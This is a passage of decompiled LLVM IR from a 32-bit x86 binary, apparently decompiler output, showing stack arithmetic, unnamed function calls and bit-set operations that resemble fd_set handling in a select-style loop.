  %v1_8048a81 = add i32 %v0_8048a80, 10388
  store i32 %v1_8048a81, i32* %ecx.global-to-local, align 4
  store i32 %v1_8048a81, i32* %v1_8048a80, align 4
  %v2_8048a89 = call i32 @function_8052620(i8* %v1_8048752)
  store i32 %v2_8048a89, i32* %eax.global-to-local, align 4
  store i32 %v2_8048a89, i32* @ebx, align 4
  %v0_8048a90 = load i32, i32* @esp, align 4
  %v1_8048a90 = inttoptr i32 %v0_8048a90 to i32*
  %v2_8048a90 = load i32, i32* %v1_8048a90, align 4
  store i32 %v2_8048a90, i32* %eax.global-to-local, align 4
  %v1_8048a91 = add i32 %v0_8048a90, 68
  %v2_8048a91 = inttoptr i32 %v1_8048a91 to i32*
  %v3_8048a91 = load i32, i32* %v2_8048a91, align 4
  store i32 %v3_8048a91, i32* %eax.global-to-local, align 4
  store i32 %v3_8048a91, i32* %v1_8048a90, align 4
  %v2_8048a96 = call i32 @function_8052620(i8* %v1_8048752)
  store i32 %v2_8048a96, i32* %eax.global-to-local, align 4
  %v0_8048a9b = load i32, i32* @esp, align 4
  %v1_8048a9e = add i32 %v0_8048a9b, 10388
  %v1_8048aa5 = load i32, i32* @ebx, align 4
  %v2_8048aa5 = add i32 %v1_8048a9e, %v1_8048aa5
  %v12_8048aa5 = icmp eq i32 %v2_8048aa5, 0
  store i1 %v12_8048aa5, i1* %zf.global-to-local, align 1
  store i32 %v2_8048aa5, i32* %edx.global-to-local, align 4
  %v2_8048aa7 = add i32 %v0_8048a9b, 8
  %v3_8048aa7 = inttoptr i32 %v2_8048aa7 to i32*
  store i32 %v2_8048aa5, i32* %v3_8048aa7, align 4
  %v1_8048aa8 = add i32 %v0_8048a9b, 4
  %v2_8048aa8 = inttoptr i32 %v1_8048aa8 to i32*
  store i32 10, i32* %v2_8048aa8, align 4
  %v3_8048aaa = inttoptr i32 %v0_8048a9b to i32*
  store i32 %v2_8048a96, i32* %v3_8048aaa, align 4
  %v4_8048aab = call i32 @function_8052a30(i64 %v3_8048aab, i32 ptrtoint (i32* @0 to i32), i32 ptrtoint (i32* @0 to i32))
  store i32 %v4_8048aab, i32* %eax.global-to-local, align 4
  %v0_8048ab0 = load i32, i32* @esp, align 4
  %v1_8048ab0 = inttoptr i32 %v0_8048ab0 to i32*
  %v2_8048ab0 = load i32, i32* %v1_8048ab0, align 4
  store i32 %v2_8048ab0, i32* @ebx, align 4
  %v1_8048ab1 = add i32 %v0_8048ab0, 10388
  store i32 %v1_8048ab1, i32* %eax.global-to-local, align 4
  store i32 %v1_8048ab1, i32* %v1_8048ab0, align 4
  %v2_8048ab9 = call i32 @function_8052620(i8* %v1_8048752)
  store i32 %v2_8048ab9, i32* %eax.global-to-local, align 4
  %v0_8048abe = load i32, i32* @esp, align 4
  %v1_8048abe = inttoptr i32 %v0_8048abe to i32*
  %v2_8048abe = load i32, i32* %v1_8048abe, align 4
  store i32 %v2_8048abe, i32* %edx.global-to-local, align 4
  %v3_8048abe = add i32 %v0_8048abe, 4
  %v1_8048abf = inttoptr i32 %v3_8048abe to i32*
  %v2_8048abf = load i32, i32* %v1_8048abf, align 4
  store i32 %v2_8048abf, i32* %ecx.global-to-local, align 4
  store i32 ptrtoint ([3 x i8]* @global_var_80554e6.10 to i32), i32* %v1_8048abf, align 4
  %v1_8048ac5 = add i32 %v0_8048abe, 10388
  store i32 %v1_8048ac5, i32* %edx.global-to-local, align 4
  %v2_8048acc = add i32 %v1_8048ac5, %v2_8048ab9
  store i32 %v2_8048acc, i32* %eax.global-to-local, align 4
  store i32 %v2_8048acc, i32* %v1_8048abe, align 4
  %v3_8048ad0 = call i32 @function_8052640(i8* %v1_8048752, i32 ptrtoint (i32* @0 to i32))
  store i32 %v3_8048ad0, i32* %eax.global-to-local, align 4
  %v0_8048ad5 = load i32, i32* @esp, align 4
  %v1_8048ad5 = add i32 %v0_8048ad5, 16
  %v6_8048ad5 = icmp eq i32 %v1_8048ad5, 0
  store i1 %v6_8048ad5, i1* %zf.global-to-local, align 1
  br label %dec_label_pc_8048ad8

dec_label_pc_8048ad8:                             ; preds = %dec_label_pc_8048700, %dec_label_pc_80489c4
  %v0_8048ae3 = phi i32 [ %v1_80489b5, %dec_label_pc_8048700 ], [ %v1_8048ad5, %dec_label_pc_80489c4 ]
  %v0_8048ad8 = load i32, i32* @esi, align 4
  %v1_8048ad8 = add i32 %v0_8048ad8, 28
  %v2_8048ad8 = inttoptr i32 %v1_8048ad8 to i32*
  %v3_8048ad8 = load i32, i32* %v2_8048ad8, align 4
  store i32 %v3_8048ad8, i32* @ebx, align 4
  %v1_8048adb = icmp eq i32 %v3_8048ad8, 0
  store i1 %v1_8048adb, i1* %zf.global-to-local, align 1
  %tmp139 = icmp slt i32 %v3_8048ad8, 1
  br i1 %tmp139, label %dec_label_pc_8048bb4, label %dec_label_pc_8048ae3

dec_label_pc_8048ae3:                             ; preds = %dec_label_pc_8048ad8
  %v9_8048ae3 = icmp eq i32 %v0_8048ae3, 12
  store i1 %v9_8048ae3, i1* %zf.global-to-local, align 1
  %v1_8048ae6 = add i32 %v0_8048ae3, 10372
  store i32 %v1_8048ae6, i32* %ecx.global-to-local, align 4
  %v2_8048aed = add i32 %v0_8048ae3, -16
  %v3_8048aed = inttoptr i32 %v2_8048aed to i32*
  store i32 %v1_8048ae6, i32* %v3_8048aed, align 4
  %v2_8048aee = call i32 @function_8052620(i8* %v1_8048752)
  store i32 %v2_8048aee, i32* %eax.global-to-local, align 4
  %v0_8048af3 = load i32, i32* @esp, align 4
  %v1_8048af3 = inttoptr i32 %v0_8048af3 to i32*
  %v2_8048af3 = load i32, i32* %v1_8048af3, align 4
  store i32 %v2_8048af3, i32* %edx.global-to-local, align 4
  %v3_8048af3 = add i32 %v0_8048af3, 4
  %v1_8048af4 = inttoptr i32 %v3_8048af3 to i32*
  %v2_8048af4 = load i32, i32* %v1_8048af4, align 4
  store i32 %v2_8048af4, i32* %ecx.global-to-local, align 4
  store i32 ptrtoint ([9 x i8]* @global_var_80554d8.11 to i32), i32* %v1_8048af4, align 4
  %v1_8048afa = add i32 %v0_8048af3, 10388
  store i32 %v1_8048afa, i32* %edx.global-to-local, align 4
  %v2_8048b01 = add i32 %v1_8048afa, %v2_8048aee
  store i32 %v2_8048b01, i32* %eax.global-to-local, align 4
  store i32 %v2_8048b01, i32* %v1_8048af3, align 4
  %v3_8048b05 = call i32 @function_8052640(i8* %v1_8048752, i32 ptrtoint (i32* @0 to i32))
  store i32 %v3_8048b05, i32* %eax.global-to-local, align 4
  %v0_8048b0a = load i32, i32* @esp, align 4
  %v1_8048b0a = add i32 %v0_8048b0a, 20916
  %v2_8048b0a = inttoptr i32 %v1_8048b0a to i32*
  store i32 0, i32* %v2_8048b0a, align 4
  %v0_8048b15 = load i32, i32* @esp, align 4
  %v1_8048b15 = add i32 %v0_8048b15, 16
  %v0_8048b18 = load i32, i32* @esi, align 4
  %v1_8048b18 = add i32 %v0_8048b18, 28
  %v2_8048b18 = inttoptr i32 %v1_8048b18 to i32*
  %v3_8048b18 = load i32, i32* %v2_8048b18, align 4
  store i32 %v3_8048b18, i32* %ebx.global-to-local, align 4
  %v1_8048b1b = icmp eq i32 %v3_8048b18, 0
  store i1 %v1_8048b1b, i1* %zf.global-to-local, align 1
  %tmp140 = icmp slt i32 %v3_8048b18, 1
  br i1 %tmp140, label %dec_label_pc_8048b8a, label %dec_label_pc_8048b1f

dec_label_pc_8048b1f:                             ; preds = %dec_label_pc_8048ae3
  store i1 true, i1* %zf.global-to-local, align 1
  store i32 0, i32* %ebx.global-to-local, align 4
  br label %dec_label_pc_8048b21

dec_label_pc_8048b21:                             ; preds = %dec_label_pc_8048b21, %dec_label_pc_8048b1f
  %v0_8048b24 = phi i32 [ %v1_8048b82, %dec_label_pc_8048b21 ], [ %v1_8048b15, %dec_label_pc_8048b1f ]
  %v0_8048b21 = phi i32 [ %v4_8048b85, %dec_label_pc_8048b21 ], [ 0, %dec_label_pc_8048b1f ]
  %v2_8048b21 = mul i32 %v0_8048b21, 128
  store i32 %v2_8048b21, i32* @ebx, align 4
  %v9_8048b24 = icmp eq i32 %v0_8048b24, 12
  store i1 %v9_8048b24, i1* %zf.global-to-local, align 1
  %v1_8048b27 = add i32 %v0_8048b24, 10372
  store i32 %v1_8048b27, i32* %ecx.global-to-local, align 4
  %v2_8048b2e = add i32 %v0_8048b24, -16
  %v3_8048b2e = inttoptr i32 %v2_8048b2e to i32*
  store i32 %v1_8048b27, i32* %v3_8048b2e, align 4
  %v2_8048b2f = call i32 @function_8052620(i8* %v1_8048752)
  store i32 %v2_8048b2f, i32* %eax.global-to-local, align 4
  %v0_8048b34 = load i32, i32* @esp, align 4
  %v1_8048b34 = inttoptr i32 %v0_8048b34 to i32*
  %v3_8048b34 = add i32 %v0_8048b34, 4
  %v0_8048b35 = load i32, i32* @ebx, align 4
  %v1_8048b35 = load i32, i32* @edi, align 4
  %v2_8048b35 = add i32 %v0_8048b35, 1472
  %v3_8048b35 = add i32 %v2_8048b35, %v1_8048b35
  store i32 %v3_8048b35, i32* %edx.global-to-local, align 4
  %v1_8048b3c = inttoptr i32 %v3_8048b34 to i32*
  %v2_8048b3c = load i32, i32* %v1_8048b3c, align 4
  store i32 %v2_8048b3c, i32* %ecx.global-to-local, align 4
  store i32 %v3_8048b35, i32* %v1_8048b3c, align 4
  %v1_8048b3e = add i32 %v0_8048b34, 10388
  store i32 %v1_8048b3e, i32* %edx.global-to-local, align 4
  %v2_8048b45 = add i32 %v1_8048b3e, %v2_8048b2f
  store i32 %v2_8048b45, i32* %eax.global-to-local, align 4
  store i32 %v2_8048b45, i32* %v1_8048b34, align 4
  %v3_8048b49 = call i32 @function_8052640(i8* %v1_8048752, i32 ptrtoint (i32* @0 to i32))
  store i32 %v3_8048b49, i32* %eax.global-to-local, align 4
  %v0_8048b4e = load i32, i32* @esp, align 4
  %v1_8048b4e = inttoptr i32 %v0_8048b4e to i32*
  %v2_8048b4e = load i32, i32* %v1_8048b4e, align 4
  store i32 %v2_8048b4e, i32* @ebx, align 4
  %v1_8048b4f = add i32 %v0_8048b4e, 10388
  store i32 %v1_8048b4f, i32* %ecx.global-to-local, align 4
  store i32 %v1_8048b4f, i32* %v1_8048b4e, align 4
  %v2_8048b57 = call i32 @function_8052620(i8* %v1_8048752)
  store i32 %v2_8048b57, i32* %eax.global-to-local, align 4
  %v0_8048b5c = load i32, i32* @esp, align 4
  %v1_8048b5c = inttoptr i32 %v0_8048b5c to i32*
  %v2_8048b5c = load i32, i32* %v1_8048b5c, align 4
  store i32 %v2_8048b5c, i32* %edx.global-to-local, align 4
  %v3_8048b5c = add i32 %v0_8048b5c, 4
  %v1_8048b5d = inttoptr i32 %v3_8048b5c to i32*
  %v2_8048b5d = load i32, i32* %v1_8048b5d, align 4
  store i32 %v2_8048b5d, i32* %ecx.global-to-local, align 4
  store i32 ptrtoint ([3 x i8]* @global_var_80554e1.12 to i32), i32* %v1_8048b5d, align 4
  %v1_8048b63 = add i32 %v0_8048b5c, 10388
  store i32 %v1_8048b63, i32* %edx.global-to-local, align 4
  %v2_8048b6a = add i32 %v1_8048b63, %v2_8048b57
  store i32 %v2_8048b6a, i32* %eax.global-to-local, align 4
  store i32 %v2_8048b6a, i32* %v1_8048b5c, align 4
  %v3_8048b6e = call i32 @function_8052640(i8* %v1_8048752, i32 ptrtoint (i32* @0 to i32))
  store i32 %v3_8048b6e, i32* %eax.global-to-local, align 4
  %v0_8048b73 = load i32, i32* @esp, align 4
  %v1_8048b73 = add i32 %v0_8048b73, 20916
  %v2_8048b73 = inttoptr i32 %v1_8048b73 to i32*
  %v3_8048b73 = load i32, i32* %v2_8048b73, align 4
  %v1_8048b7a = add i32 %v3_8048b73, 1
  store i32 %v1_8048b7a, i32* %ebx.global-to-local, align 4
  store i32 %v1_8048b7a, i32* %v2_8048b73, align 4
  %v0_8048b82 = load i32, i32* @esp, align 4
  %v1_8048b82 = add i32 %v0_8048b82, 16
  %v0_8048b85 = load i32, i32* @esi, align 4
  %v1_8048b85 = add i32 %v0_8048b85, 28
  %v2_8048b85 = inttoptr i32 %v1_8048b85 to i32*
  %v3_8048b85 = load i32, i32* %v2_8048b85, align 4
  %v4_8048b85 = load i32, i32* %ebx.global-to-local, align 4
  %v5_8048b85 = sub i32 %v3_8048b85, %v4_8048b85
  %v11_8048b85 = xor i32 %v4_8048b85, %v3_8048b85
  %v12_8048b85 = xor i32 %v5_8048b85, %v3_8048b85
  %v13_8048b85 = and i32 %v12_8048b85, %v11_8048b85
  %v14_8048b85 = icmp slt i32 %v13_8048b85, 0
  %v15_8048b85 = icmp eq i32 %v5_8048b85, 0
  store i1 %v15_8048b85, i1* %zf.global-to-local, align 1
  %v16_8048b85 = icmp slt i32 %v5_8048b85, 0
  %v3_8048b88 = icmp eq i1 %v16_8048b85, %v14_8048b85
  %v4_8048b88 = icmp eq i1 %v15_8048b85, false
  %v5_8048b88 = and i1 %v4_8048b88, %v3_8048b88
  br i1 %v5_8048b88, label %dec_label_pc_8048b21, label %dec_label_pc_8048b8a

dec_label_pc_8048b8a:                             ; preds = %dec_label_pc_8048b21, %dec_label_pc_8048ae3
  %v0_8048b8a = phi i32 [ %v1_8048b15, %dec_label_pc_8048ae3 ], [ %v1_8048b82, %dec_label_pc_8048b21 ]
  %v9_8048b8a = icmp eq i32 %v0_8048b8a, 12
  store i1 %v9_8048b8a, i1* %zf.global-to-local, align 1
  %v1_8048b8d = add i32 %v0_8048b8a, 10372
  store i32 %v1_8048b8d, i32* %ecx.global-to-local, align 4
  %v2_8048b94 = add i32 %v0_8048b8a, -16
  %v3_8048b94 = inttoptr i32 %v2_8048b94 to i32*
  store i32 %v1_8048b8d, i32* %v3_8048b94, align 4
  %v2_8048b95 = call i32 @function_8052620(i8* %v1_8048752)
  store i32 %v2_8048b95, i32* %eax.global-to-local, align 4
  %v0_8048b9a = load i32, i32* @esp, align 4
  %v1_8048b9a = inttoptr i32 %v0_8048b9a to i32*
  %v2_8048b9a = load i32, i32* %v1_8048b9a, align 4
  store i32 %v2_8048b9a, i32* @ebx, align 4
  %v3_8048b9a = add i32 %v0_8048b9a, 4
  %v1_8048b9b = inttoptr i32 %v3_8048b9a to i32*
  %v2_8048b9b = load i32, i32* %v1_8048b9b, align 4
  store i32 %v2_8048b9b, i32* %edi.global-to-local, align 4
  store i32 ptrtoint ([3 x i8]* @global_var_80554e6.10 to i32), i32* %v1_8048b9b, align 4
  %v1_8048ba1 = add i32 %v0_8048b9a, 10388
  store i32 %v1_8048ba1, i32* %edx.global-to-local, align 4
  %v2_8048ba8 = add i32 %v1_8048ba1, %v2_8048b95
  store i32 %v2_8048ba8, i32* %eax.global-to-local, align 4
  store i32 %v2_8048ba8, i32* %v1_8048b9a, align 4
  %v3_8048bac = call i32 @function_8052640(i8* %v1_8048752, i32 ptrtoint (i32* @0 to i32))
  store i32 %v3_8048bac, i32* %eax.global-to-local, align 4
  %v0_8048bb1 = load i32, i32* @esp, align 4
  %v1_8048bb1 = add i32 %v0_8048bb1, 16
  %v6_8048bb1 = icmp eq i32 %v1_8048bb1, 0
  store i1 %v6_8048bb1, i1* %zf.global-to-local, align 1
  br label %dec_label_pc_8048bb4

dec_label_pc_8048bb4:                             ; preds = %dec_label_pc_8048ad8, %dec_label_pc_8048b8a
  %v0_8048bb4 = phi i32 [ %v0_8048ae3, %dec_label_pc_8048ad8 ], [ %v1_8048bb1, %dec_label_pc_8048b8a ]
  %v9_8048bb4 = icmp eq i32 %v0_8048bb4, 12
  store i1 %v9_8048bb4, i1* %zf.global-to-local, align 1
  %v1_8048bb7 = add i32 %v0_8048bb4, 10372
  store i32 %v1_8048bb7, i32* %ecx.global-to-local, align 4
  %v2_8048bbe = add i32 %v0_8048bb4, -16
  %v3_8048bbe = inttoptr i32 %v2_8048bbe to i32*
  store i32 %v1_8048bb7, i32* %v3_8048bbe, align 4
  %v2_8048bbf = call i32 @function_8052620(i8* %v1_8048752)
  store i32 %v2_8048bbf, i32* %eax.global-to-local, align 4
  %v0_8048bc4 = load i32, i32* @esp, align 4
  %v1_8048bc4 = inttoptr i32 %v0_8048bc4 to i32*
  %v2_8048bc4 = load i32, i32* %v1_8048bc4, align 4
  store i32 %v2_8048bc4, i32* %edx.global-to-local, align 4
  %v3_8048bc4 = add i32 %v0_8048bc4, 4
  %v1_8048bc5 = inttoptr i32 %v3_8048bc4 to i32*
  %v2_8048bc5 = load i32, i32* %v1_8048bc5, align 4
  store i32 %v2_8048bc5, i32* %ecx.global-to-local, align 4
  store i32 ptrtoint ([3 x i8]* @global_var_80554e6.10 to i32), i32* %v1_8048bc5, align 4
  %v1_8048bcb = add i32 %v0_8048bc4, 10388
  store i32 %v1_8048bcb, i32* %edx.global-to-local, align 4
  %v2_8048bd2 = add i32 %v1_8048bcb, %v2_8048bbf
  store i32 %v2_8048bd2, i32* %eax.global-to-local, align 4
  store i32 %v2_8048bd2, i32* %v1_8048bc4, align 4
  %v3_8048bd6 = call i32 @function_8052640(i8* %v1_8048752, i32 ptrtoint (i32* @0 to i32))
  store i32 %v3_8048bd6, i32* %eax.global-to-local, align 4
  %v0_8048bdb = load i32, i32* @esp, align 4
  %v1_8048bdb = add i32 %v0_8048bdb, 16
  %v1_8048bde = add i32 %v0_8048bdb, 68
  %v2_8048bde = inttoptr i32 %v1_8048bde to i32*
  %v3_8048bde = load i32, i32* %v2_8048bde, align 4
  store i32 %v3_8048bde, i32* @edi, align 4
  %v1_8048be2 = icmp eq i32 %v3_8048bde, 0
  store i1 %v1_8048be2, i1* %zf.global-to-local, align 1
  br i1 %v1_8048be2, label %dec_label_pc_8048c10, label %dec_label_pc_8048be6

dec_label_pc_8048be6:                             ; preds = %dec_label_pc_8048bb4
  %v9_8048be6 = icmp eq i32 %v0_8048bdb, -4
  store i1 %v9_8048be6, i1* %zf.global-to-local, align 1
  %v1_8048be9 = add i32 %v0_8048bdb, 10388
  store i32 %v1_8048be9, i32* %ecx.global-to-local, align 4
  %v3_8048bf0 = inttoptr i32 %v0_8048bdb to i32*
  store i32 %v1_8048be9, i32* %v3_8048bf0, align 4
  %v2_8048bf1 = call i32 @function_8052620(i8* %v1_8048752)
  store i32 %v2_8048bf1, i32* %eax.global-to-local, align 4
  %v0_8048bf6 = load i32, i32* @esp, align 4
  %v1_8048bf6 = inttoptr i32 %v0_8048bf6 to i32*
  %v2_8048bf6 = load i32, i32* %v1_8048bf6, align 4
  store i32 %v2_8048bf6, i32* %ecx.global-to-local, align 4
  %v3_8048bf6 = add i32 %v0_8048bf6, 4
  %v1_8048bf7 = inttoptr i32 %v3_8048bf6 to i32*
  %v2_8048bf7 = load i32, i32* %v1_8048bf7, align 4
  store i32 %v2_8048bf7, i32* @ebx, align 4
  %v1_8048bf8 = add i32 %v0_8048bf6, 68
  %v2_8048bf8 = inttoptr i32 %v1_8048bf8 to i32*
  %v3_8048bf8 = load i32, i32* %v2_8048bf8, align 4
  store i32 %v3_8048bf8, i32* %v1_8048bf7, align 4
  %v1_8048bfd = add i32 %v0_8048bf6, 10388
  store i32 %v1_8048bfd, i32* %edx.global-to-local, align 4
  %v2_8048c04 = add i32 %v1_8048bfd, %v2_8048bf1
  store i32 %v2_8048c04, i32* %eax.global-to-local, align 4
  store i32 %v2_8048c04, i32* %v1_8048bf6, align 4
  %v3_8048c08 = call i32 @function_8052640(i8* %v1_8048752, i32 ptrtoint (i32* @0 to i32))
  store i32 %v3_8048c08, i32* %eax.global-to-local, align 4
  %v0_8048c0d = load i32, i32* @esp, align 4
  %v1_8048c0d = add i32 %v0_8048c0d, 16
  %v6_8048c0d = icmp eq i32 %v1_8048c0d, 0
  store i1 %v6_8048c0d, i1* %zf.global-to-local, align 1
  br label %dec_label_pc_8048c10

dec_label_pc_8048c10:                             ; preds = %dec_label_pc_8048bb4, %dec_label_pc_8048be6
  %v1_8048c10 = phi i32 [ %v1_8048bdb, %dec_label_pc_8048bb4 ], [ %v1_8048c0d, %dec_label_pc_8048be6 ]
  %v0_8048c10 = phi i32 [ %v3_8048bd6, %dec_label_pc_8048bb4 ], [ %v3_8048c08, %dec_label_pc_8048be6 ]
  %v2_8048c10 = add i32 %v1_8048c10, -4
  %v3_8048c10 = inttoptr i32 %v2_8048c10 to i32*
  store i32 %v0_8048c10, i32* %v3_8048c10, align 4
  %v0_8048c11 = load i32, i32* %eax.global-to-local, align 4
  %v2_8048c11 = add i32 %v1_8048c10, -8
  %v3_8048c11 = inttoptr i32 %v2_8048c11 to i32*
  store i32 %v0_8048c11, i32* %v3_8048c11, align 4
  %v0_8048c12 = load i32, i32* @esi, align 4
  %v2_8048c12 = add i32 %v1_8048c10, -12
  %v3_8048c12 = inttoptr i32 %v2_8048c12 to i32*
  store i32 %v0_8048c12, i32* %v3_8048c12, align 4
  %v1_8048c13 = add i32 %v1_8048c10, 96
  %v2_8048c13 = inttoptr i32 %v1_8048c13 to i32*
  %v3_8048c13 = load i32, i32* %v2_8048c13, align 4
  store i32 %v3_8048c13, i32* %eax.global-to-local, align 4
  %v2_8048c17 = add i32 %v1_8048c10, -16
  %v3_8048c17 = inttoptr i32 %v2_8048c17 to i32*
  store i32 %v3_8048c13, i32* %v3_8048c17, align 4
  %v0_8048c18 = call i32 @function_8052990()
  store i32 %v0_8048c18, i32* %eax.global-to-local, align 4
  %v0_8048c1d = load i32, i32* @esp, align 4
  %v1_8048c1d = add i32 %v0_8048c1d, 16
  %v3_8048c20 = trunc i32 %v0_8048c18 to i8
  %v4_8048c20 = icmp eq i8 %v3_8048c20, 0
  store i1 %v4_8048c20, i1* %zf.global-to-local, align 1
  br i1 %v4_8048c20, label %dec_label_pc_804979e, label %dec_label_pc_8048c28

dec_label_pc_8048c28:                             ; preds = %dec_label_pc_8048c10, %dec_label_pc_804979e
  %v0_8048c28 = phi i32 [ %v1_8048c1d, %dec_label_pc_8048c10 ], [ %v1_80497ab, %dec_label_pc_804979e ]
  %v9_8048c28 = icmp eq i32 %v0_8048c28, 12
  store i1 %v9_8048c28, i1* %zf.global-to-local, align 1
  %v1_8048c2b = add i32 %v0_8048c28, 10372
  store i32 %v1_8048c2b, i32* %ecx.global-to-local, align 4
  %v2_8048c32 = add i32 %v0_8048c28, -16
  %v3_8048c32 = inttoptr i32 %v2_8048c32 to i32*
  store i32 %v1_8048c2b, i32* %v3_8048c32, align 4
  %v2_8048c33 = call i32 @function_8052620(i8* %v1_8048752)
  %v0_8048c38 = load i32, i32* @esp, align 4
  %v1_8048c38 = add i32 %v0_8048c38, -4
  %v2_8048c38 = inttoptr i32 %v1_8048c38 to i32*
  store i32 16384, i32* %v2_8048c38, align 4
  %v2_8048c3d = add i32 %v0_8048c38, -8
  %v3_8048c3d = inttoptr i32 %v2_8048c3d to i32*
  store i32 %v2_8048c33, i32* %v3_8048c3d, align 4
  %v1_8048c3e = add i32 %v0_8048c38, 10388
  store i32 %v1_8048c3e, i32* %eax.global-to-local, align 4
  %v2_8048c45 = add i32 %v0_8048c38, -12
  %v3_8048c45 = inttoptr i32 %v2_8048c45 to i32*
  store i32 %v1_8048c3e, i32* %v3_8048c45, align 4
  %v0_8048c46 = load i32, i32* @esi, align 4
  %v1_8048c46 = add i32 %v0_8048c46, -1440
  %v2_8048c46 = inttoptr i32 %v1_8048c46 to i32*
  %v3_8048c46 = load i32, i32* %v2_8048c46, align 4
  store i32 %v3_8048c46, i32* %ecx.global-to-local, align 4
  %v2_8048c4c = add i32 %v0_8048c38, -16
  %v3_8048c4c = inttoptr i32 %v2_8048c4c to i32*
  store i32 %v3_8048c46, i32* %v3_8048c4c, align 4
  %v0_8048c4d = call i32 @function_8053304()
  store i32 %v0_8048c4d, i32* %eax.global-to-local, align 4
  %v0_8048c52 = load i32, i32* @esp, align 4
  %v1_8048c52 = add i32 %v0_8048c52, 112
  %v2_8048c52 = inttoptr i32 %v1_8048c52 to i32*
  %v3_8048c52 = load i32, i32* %v2_8048c52, align 4
  store i32 %v3_8048c52, i32* %edx.global-to-local, align 4
  %v0_8048c56 = load i32, i32* @esi, align 4
  %v1_8048c56 = add i32 %v0_8048c56, -1440
  %v2_8048c56 = inttoptr i32 %v1_8048c56 to i32*
  %v3_8048c56 = load i32, i32* %v2_8048c56, align 4
  store i32 %v3_8048c56, i32* %eax.global-to-local, align 4
  %v2_8048c5c = add i32 %v0_8048c56, -1428
  %v3_8048c5c = inttoptr i32 %v2_8048c5c to i32*
  store i32 %v3_8048c52, i32* %v3_8048c5c, align 4
  %v0_8048c62 = load i32, i32* %eax.global-to-local, align 4
  store i32 %v0_8048c62, i32* %edx.global-to-local, align 4
  %v0_8048c64 = load i32, i32* @esi, align 4
  %v1_8048c64 = add i32 %v0_8048c64, -1436
  %v2_8048c64 = inttoptr i32 %v1_8048c64 to i8*
  store i8 6, i8* %v2_8048c64, align 1
  %v0_8048c6b = load i32, i32* %eax.global-to-local, align 4
  %v1_8048c6b = urem i32 %v0_8048c6b, 32
  store i32 %v1_8048c6b, i32* %eax.global-to-local, align 4
  %v0_8048c6e = load i32, i32* %edx.global-to-local, align 4
  %v2_8048c6e = udiv i32 %v0_8048c6e, 32
  store i32 %v2_8048c6e, i32* %edx.global-to-local, align 4
  %v0_8048c71 = load i32, i32* @esp, align 4
  %v2_8048c71 = mul nuw nsw i32 %v2_8048c6e, 4
  %v3_8048c71 = add nuw nsw i32 %v2_8048c71, 20772
  %v4_8048c71 = add i32 %v3_8048c71, %v0_8048c71
  %v5_8048c71 = inttoptr i32 %v4_8048c71 to i32*
  %v6_8048c71 = load i32, i32* %v5_8048c71, align 4
  %v9_8048c71 = shl i32 1, %v1_8048c6b
  %v12_8048c71 = or i32 %v6_8048c71, %v9_8048c71
  %v16_8048c71 = add i32 %v0_8048c71, 20772
  %v17_8048c71 = add i32 %v16_8048c71, %v2_8048c71
  %v18_8048c71 = inttoptr i32 %v17_8048c71 to i32*
  store i32 %v12_8048c71, i32* %v18_8048c71, align 4
  %v0_8048c79 = load i32, i32* @esp, align 4
  %v1_8048c79 = add i32 %v0_8048c79, 32
  %v0_8048c7c = load i32, i32* @esi, align 4
  %v1_8048c7c = add i32 %v0_8048c7c, -1440
  %v2_8048c7c = inttoptr i32 %v1_8048c7c to i32*
  %v3_8048c7c = load i32, i32* %v2_8048c7c, align 4
  store i32 %v3_8048c7c, i32* %eax.global-to-local, align 4
  %v1_8048c82 = add i32 %v0_8048c79, 104
  %v2_8048c82 = inttoptr i32 %v1_8048c82 to i32*
  %v3_8048c82 = load i32, i32* %v2_8048c82, align 4
  %v5_8048c82 = sub i32 %v3_8048c82, %v3_8048c7c
  %v11_8048c82 = xor i32 %v3_8048c82, %v3_8048c7c
  %v12_8048c82 = xor i32 %v5_8048c82, %v3_8048c82
  %v13_8048c82 = and i32 %v12_8048c82, %v11_8048c82
  %v14_8048c82 = icmp slt i32 %v13_8048c82, 0
  %v15_8048c82 = icmp eq i32 %v5_8048c82, 0
  store i1 %v15_8048c82, i1* %zf.global-to-local, align 1
  %v16_8048c82 = icmp slt i32 %v5_8048c82, 0
  %v2_8048c86 = icmp eq i1 %v16_8048c82, %v14_8048c82
  br i1 %v2_8048c86, label %dec_label_pc_8048582, label %dec_label_pc_80486e4

dec_label_pc_8048c91:                             ; preds = %dec_label_pc_80486ee
  store i8 0, i8* %v2_80485a5, align 1
  br label %dec_label_pc_80485be

dec_label_pc_8048c9d:                             ; preds = %dec_label_pc_8048537
  %v0_8048c9d = load i32, i32* @esp, align 4
  %v1_8048c9d = add i32 %v0_8048c9d, 80
  %v2_8048c9d = inttoptr i32 %v1_8048c9d to i32*
  %v3_8048c9d = load i32, i32* %v2_8048c9d, align 4
  store i32 %v3_8048c9d, i32* %eax.global-to-local, align 4
  %v1_8048ca1 = add i32 %v0_80485a5, -1432
  %v2_8048ca1 = inttoptr i32 %v1_8048ca1 to i32*
  %v3_8048ca1 = load i32, i32* %v2_8048ca1, align 4
  store i32 %v3_8048ca1, i32* @ebx, align 4
  %v2_8048ca7 = sub i32 %v3_8048c9d, %v3_8048ca1
  store i32 %v2_8048ca7, i32* %eax.global-to-local, align 4
  %v9_8048ca9 = icmp eq i32 %v2_8048ca7, 30
  store i1 %v9_8048ca9, i1* %zf.global-to-local, align 1
  %tmp239 = icmp ult i32 %v2_8048ca7, 31
  br i1 %tmp239, label %dec_label_pc_8048cb2, label %dec_label_pc_804855f

dec_label_pc_8048cb2:                             ; preds = %dec_label_pc_8048c9d
  %v1_8048cb2 = add i32 %v0_80485a5, -1440
  %v2_8048cb2 = inttoptr i32 %v1_8048cb2 to i32*
  %v3_8048cb2 = load i32, i32* %v2_8048cb2, align 4
  %v1_8048cba = urem i32 %v3_8048cb2, 32
  store i32 %v1_8048cba, i32* %eax.global-to-local, align 4
  %v2_8048cbd = udiv i32 %v3_8048cb2, 32
  store i32 %v2_8048cbd, i32* %edx.global-to-local, align 4
  %v2_8048cc0 = mul nuw nsw i32 %v2_8048cbd, 4
  %v3_8048cc0 = add i32 %v0_8048c9d, 20612
  %v4_8048cc0 = add i32 %v3_8048cc0, %v2_8048cc0
  %v5_8048cc0 = inttoptr i32 %v4_8048cc0 to i32*
  %v6_8048cc0 = load i32, i32* %v5_8048cc0, align 4
  %v9_8048cc0 = shl i32 1, %v1_8048cba
  %v12_8048cc0 = or i32 %v6_8048cc0, %v9_8048cc0
  store i32 %v12_8048cc0, i32* %v5_8048cc0, align 4
  %v0_8048cc8 = load i32, i32* @esi, align 4
  %v1_8048cc8 = add i32 %v0_8048cc8, -1440
  %v2_8048cc8 = inttoptr i32 %v1_8048cc8 to i32*
  %v3_8048cc8 = load i32, i32* %v2_8048cc8, align 4
